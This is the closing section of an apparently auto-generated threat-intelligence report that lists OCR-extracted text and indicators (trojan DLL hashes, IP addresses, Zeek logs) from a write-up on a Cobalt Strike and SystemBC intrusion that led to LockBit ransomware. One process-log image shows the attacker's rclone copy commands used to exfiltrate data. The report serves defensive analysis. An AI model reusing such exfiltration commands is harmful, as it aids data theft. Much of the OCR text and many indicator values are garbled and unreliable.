> @ 31172.83162 @ 159100142...  ; 4  | | a SEGGRRRSS__——oeees_Seeeeo__ ones —__ seen  [ocio0 losio0 120018100 [00:00 [06:00 12°00 18:00  @timestamp per 3 hours

</details>

<details>
<summary><strong>Image 41</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_044_5a00f4daa3a0.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_044_5a00f4daa3a0.png)

**IOCs Found:**
- `svemce.dll`
- `c59cbd309b3393cb08a1133364ed11000fdd418d`

**Extracted Text:**
> B® General  Target  svemce.dll  Size  12.8MB  Sample 250120-s8ydwavedd  MDS Qaa0Sebe3b6667954898cfecc4057600  SHAI c59cbd309b3393cb08a1133364ed11000fdd418d  SHA256 44cf04192384e92021510e335561076050129ad7a43b58b1319falf950f6a7b6 SHA512  ddabd9c548fa8el1e6681585b8e5375b216955ef8b621fb3a27F74e2897 Se8cb696df18cf96bd6e1229a d0c268877126caabc15b5849¢3d401a45675aa0b2b3if  SSDEEP 393216:99pRr+jrfTxceLsf4KseXYpfkAxu70SVVmr-7+jTTxccsfRXAWmr  Score  10”  SYSTEMBC  TROJAN

</details>

<details>
<summary><strong>Image 42</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_045_66587548fc6b.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_045_66587548fc6b.png)

**Extracted Text:**
> Zeek Destination Bytes Top Traffic  @timestamp per 3 hours  @ 185.236.23.. #  $ = 4 3 3 2 ° E 5 3

</details>

<details>
<summary><strong>Image 43</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_046_7392ac0d7982.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_046_7392ac0d7982.png)

**IOCs Found:**
- `destination.ip`
- `url.domain`
- `91.142.74.28`
- `event.dataset`
- `195.2.70.38`
- `38.180.61.247`
- `http.response`

**Extracted Text:**
> t event.dataset  zeek  zeek  zeek  zeek  zeek  zeek  zeek  zeek  zeek  -http  -http  -http  -http  -http  -http  -http  -http  -http  10  10  10  10  10  10  10  10  12  12  12  15  15  15  15  15  15  t destination.ip  38.180.61.247  195.2.70.38  38.180.61.247  38.180.61.247  195.2.70.38  38.180.61.247  195.2.70.38  38.180.61.247  91.142.74.28  # http.response.status_code  409  200  429  409  200  429  200  429  429  t user_agent original  Go-http-client/1.1  Go-http-client/1.1  Go-http-client/...

</details>

<details>
<summary><strong>Image 44</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_047_9aaadba72503.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_047_9aaadba72503.png)

**Extracted Text:**
> Zeek Destination Bytes Top Traffic  © se1s061247 com © 19527038 © 10023839. o o1182 7828 | © 04103009 A= : soon ° 5 mm  Joo'c0 06:00 12:00 18:00 © |o0:00 © lo6:00 11200 |18:00-loo:00 [06:00 1200 1800 |  ° loo:00  lo6:00 12:00 18:00 |o0:00 © |06:00- |12:00 [18:00 © [00:00 06:00 /12:00 © |18:00- foo:00 (06:00 12:00 18:00 [oo:00 [06:00 12:00 18:00 -—|oo:00 06:00 © 12:00 18:00 loo:00 06:00 12:00 18:00  @timestamp per 3 hours

</details>

<details>
<summary><strong>Image 45</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_048_4368df2f6c29.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_048_4368df2f6c29.png)

**Extracted Text:**
> "visit_count": 1,  "secure_dir": 0,  "sync_time": ” 18:05:43+00 "url": "https: //wui bing. com/search?q "file_size": 0, "cache_id": 0, "modified_time": * "url_hash”: 2417732497183981456, "expiry_time": " "_time": * "entry_id": 7, "user": ' lo "container_id": 8  "visit_count": 1,  "secure_dir": 0,  "sync_time": ” 18:01:26+00 "url": "https: //wui bing. com/search?q "file_size": 0, "cache_id": 0, "modified_time": * "url_hash”: 2417732498084692771, "expiry_time": "  " time": * "entry_id": 4, "user":...

</details>

<details>
<summary><strong>Image 46</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_049_1afc67ee29b7.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_049_1afc67ee29b7.png)

**IOCs Found:**
- `process.name`
- `rclone.exe`
- `process.parent`
- `relone.exe`
- `process.args`

**Extracted Text:**
> Process.name V process.parent.name  process.args  «\relone.exe, copy, E:\ \ ME nega (MME <q, --ignore-existing, --auto-confirm, --multi-thread-streams, 12, --transfers, 12, --no-console .\relone.exe, copy, &:(MA MIN, ego SIRI. —c, --ignore-existing, —-auto-confirm, ~-multi-thread-streams, 12, --transfers, 12, ~-no-console s\rclone.exe, copy, E:\ | ES cc <9, --ignore-existing, --auto-confirm, --multi-thread-streams, 12 EE <c2 I) ~<. --ignore-existing, --auto-confirm, --multi-thread-streams, 12, -...

</details>

<details>
<summary><strong>Image 47</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_050_f601b3fa556b.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_050_f601b3fa556b.png)

**IOCs Found:**
- `event.dataset`
- `source.port`
- `source.ip`
- `zeek.connection`

**Extracted Text:**
> t event.dataset  zeek.  zeek.  zeek.  zeek.  zeek.  zeek.  zeek.  connection  connection  connection  connection  connection  connection  connection  t source.ip 18 2 18 2 18 12 18 2 18 2 18 2 18 2  # source.port  51, 552  51, 552  51, 552  51, 583  51,583  51, 583  51,617  t  93.  93.  93.  93.  93.  93.  93.  115.  115.  115.  115.  115.  115.  26.  26.  26.  26.  26.  26.  127  127  127  127  127  127  127  21  21  21  21  21  21  t zeek.connection.state_message  Connection attempt rejected....

</details>

**OCR Summary:** 46 images processed with text extracted

---

*Generated by PEAK CTI v3.0 Multi-Source Consolidated Report*
*2026-01-09 00:57:26 UTC*